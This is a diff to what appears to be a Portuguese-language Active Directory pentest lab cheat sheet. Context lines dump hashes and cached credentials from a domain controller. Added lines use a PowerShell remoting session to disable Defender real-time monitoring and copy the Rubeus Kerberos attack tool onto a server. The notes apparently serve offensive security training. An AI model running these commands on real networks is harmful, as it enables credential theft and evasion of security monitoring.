@@ -2930,10 +2930,19 @@ Get-RemoteMachineAccountHash -Computername dcorp-dc -Verbose
 Get-RemoteLocalAccountHash -Computername dcorp-dc -Verbose
 Get-RemoteCachedCredential -Computername dcorp-dc -Verbose
 ```
-
-
-
-
+##### POWERSHELL - COPIAR ARQUIVOS USANDO A SESSÃO PSREMOTING
+```
+$MYSESSION = New-PSSession dcorp-appsrv
+Enter-PSSession $MYSESSION
+Set-MpPreference -DisableRealtimeMonitoring $true
+exit
+```
+```
+Copy-Item -ToSession $appsrv1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\appadmin\
+Enter-PSSession $appsrv1
+cd C:\Users\appadmin\
+ls
+```
 
 
 
